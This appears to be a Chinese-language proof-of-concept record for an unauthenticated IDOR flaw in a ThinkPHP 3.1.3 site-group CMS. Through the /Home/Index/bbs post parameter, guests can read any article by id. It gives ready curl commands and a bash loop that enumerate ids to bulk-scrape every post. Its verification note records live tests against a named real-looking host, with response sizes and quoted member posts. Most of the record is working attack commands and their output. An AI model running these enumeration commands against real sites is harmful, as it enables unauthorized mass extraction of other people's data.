# ThinkPHP 3.1.3 站群 /Home/Index/bbs 的 post 参数零鉴权渲染文章正文（游客态可批量拖全站帖子）

- **code**: thinkphp-3.1.3-站群-home-index-bbs-的-post-参数零鉴权渲染文章正文-游客态可批量拖
- **kind**: poc
- **category**: unauthorized
- **component**: SomCNS 站群 CMS（ThinkPHP 3.1.3）Home/Index::bbs
- **severity**: medium
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-29 在 https://thbac1dsua6v.csnsg36j8n.xyz 零 Cookie 实测：GET /Home/Index/bbs/post/1 → 200/25996B 空模板基线；post/8000 → 200/125023B 真实正文（含会员发帖「今晚的直接给大家大中了…」「成功收米！」）；?post=9999 → 200/27563B；长度随 id 变化：2000→27921、5000→42644、8000→125023、9999→27563、10000→27659、15000→187540B；页面头部显示「您现在是游客」，该渲染点未做登录/购买校验。
- **path**: pocs/thinkphp-3.1.3-站群-home-index-bbs-的-post-参数零鉴权渲染文章正文-游客态可批量拖/poc.txt
- **tags**: thinkphp3.1.3,站群,idor,未授权读取,文章枚举,bbs
- **created_at**: 2026-10-28T18:59:29.048Z
- **engine**: https://thbac1dsua6v.csnsg36j8n.xyz

## 描述

前台 /Home/Index/bbs 的文章详情渲染不做身份与付费校验，游客态传 post=<id>（query 或 PATH_INFO 均可）即直出 article 表该 id 的记录正文，id 可枚举。

## 用法

```
curl -k "https://TARGET/Home/Index/bbs?post=8000"
curl -k "https://TARGET/Home/Index/bbs/post/8000"
# 判据：200 且正文为真实文章（体积随 id 明显变化）；id=1~1000 多返回 25996B 空模板
# 批量：for i in $(seq 2000 2000 20000); do curl -sk -o /dev/null -w "$i %{size_download}\n" "https://TARGET/Home/Index/bbs?post=$i"; done
```

## 正文

```
## 现象
- `GET /Home/Index/bbs?post=<id>` 与 `GET /Home/Index/bbs/post/<id>` 等价
- 零 Cookie、游客态直接渲染 article 记录正文，无登录/付费/权限校验
- 空模板基线 25996B（id=1~1000）；真实文章体积显著不同

## 实测数据
| id | 状态码 | 字节 |
|---|---|---|
| 1 | 200 | 25996（空模板） |
| 2000 | 200 | 27921 |
| 5000 | 200 | 42644 |
| 8000 | 200 | 125023（真实正文，多条会员发帖） |
| 9999 | 200 | 27563 |
| 10000 | 200 | 27659 |
| 15000 | 200 | 187540 |

## 影响
可无凭据枚举 id 批量拖取全站文章正文（博彩推荐/会员付费内容）。

## 备注
该样本帖价格字段为空，付费内容绕过未单独坐实；结论限定为「未做身份校验的越权读取」。
```
